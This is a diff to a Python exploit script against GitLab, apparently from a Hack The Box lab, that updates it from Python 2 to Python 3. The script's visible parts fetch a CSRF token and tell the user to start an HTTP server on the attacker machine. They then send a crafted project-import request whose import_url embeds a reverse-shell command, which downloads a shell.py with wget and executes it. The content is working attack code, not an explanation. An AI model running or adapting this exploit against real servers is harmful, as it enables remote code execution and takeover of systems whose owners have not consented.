@@ -39,7 +39,7 @@ lport = args.p
 #Retrieve CSRF Token
 
 warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
-gitlab_url = "http://10.129.49.67:5080"
+gitlab_url = "http://10.10.10.220:5080"
 request = requests.Session()
 print("[+] Retrieving CSRF token to submit the login form")
 time.sleep(1)
@@ -120,7 +120,7 @@ print("[+] Start HTTP Server in current directory")
 print("Command : python3 -m http.server 80")
 time.sleep(2)
 
-http_server = raw_input("Continue (Y/N) : ")
+http_server = input("Continue (Y/N) : ")
 
 if (http_server=="N") or (http_server=="n"):
 	print("Start HTTP Server before running exploit")
@@ -134,7 +134,7 @@ elif (http_server=="Y") or (http_server=="y"):
 	print("Option 1 : Download shell.py rev shell to server using wget")
 	print("Option 2 : Execute shell.py downloaded previously")
 
-	option = raw_input("Option (1/2) : ")
+	option = input("Option (1/2) : ")
 
 
 	if option=="1":
@@ -158,7 +158,9 @@ elif (http_server=="Y") or (http_server=="y"):
 		urlencoded_token_final = urlencoded_token1.replace("+","%2B")
 		
 
-		payload=b"utf8=%E2%9C%93&authenticity_token={}&project%5Bimport_url%5D={}{}&project%5Bci_cd_only%5D=false&project%5Bname%5D={}&project%5Bnamespace_id%5D={}&project%5Bpath%5D={}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0".format(urlencoded_token_final,ipv6_url,reverse_shell,project_name,namespace_id,project_name)
+		payload="utf8=%E2%9C%93&authenticity_token={}&project%5Bimport_url%5D={}{}&project%5Bci_cd_only%5D=false&project%5Bname%5D={}&project%5Bnamespace_id%5D={}&project%5Bpath%5D={}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0".format(urlencoded_token_final,ipv6_url,reverse_shell,project_name,namespace_id,project_name)
+		
+		payload = bytes(payload,encoding='utf8')
 
 
 
@@ -221,9 +223,9 @@ elif (http_server=="Y") or (http_server=="y"):
 		urlencoded_token_final = urlencoded_token1.replace("+","%2B")
 
 
-		payload=b"utf8=%E2%9C%93&authenticity_token={}&project%5Bimport_url%5D={}{}&project%5Bci_cd_only%5D=false&project%5Bname%5D={}&project%5Bnamespace_id%5D={}&project%5Bpath%5D={}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0".format(urlencoded_token_final,ipv6_url,reverse_shell,project_name,namespace_id,project_name)
+		payload="utf8=%E2%9C%93&authenticity_token={}&project%5Bimport_url%5D={}{}&project%5Bci_cd_only%5D=false&project%5Bname%5D={}&project%5Bnamespace_id%5D={}&project%5Bpath%5D={}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0".format(urlencoded_token_final,ipv6_url,reverse_shell,project_name,namespace_id,project_name)
 
-
+		payload = bytes(payload,encoding='utf8')
 
 
 
